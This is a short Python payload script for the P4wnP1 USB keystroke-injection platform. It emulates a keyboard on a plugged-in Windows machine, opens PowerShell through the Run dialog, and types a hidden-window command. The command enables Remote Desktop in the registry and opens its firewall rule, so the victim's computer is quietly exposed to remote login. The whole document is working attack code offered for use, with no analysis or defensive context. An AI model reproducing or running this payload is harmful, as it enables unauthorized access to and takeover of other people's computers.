#!/usr/bin/env python3
import os, sys, time

P4WN_HOME = os.environ.get("P4WN_HOME", "/opt/p4wnp1")
sys.path.insert(0, os.path.join(P4WN_HOME, "tools"))
from hid_type import win_r, type_string

def main():
    print("[*] Enabling RDP and allowing it through the firewall...")

    win_r(); time.sleep(0.5)
    type_string("powershell\n"); time.sleep(1)

    # PowerShell command to enable RDP and open firewall port
    ps = '''
Set-ItemProperty -Path "HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server" -Name "fDenyTSConnections" -Value 0;
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
'''

    cmd = "powershell -nop -w hidden -c \"" + ps.replace('\n', '').replace('"', '`"') + "\""
    type_string(cmd + "\n")
    print("[+] RDP access enabled.")

if __name__ == "__main__":
    main()
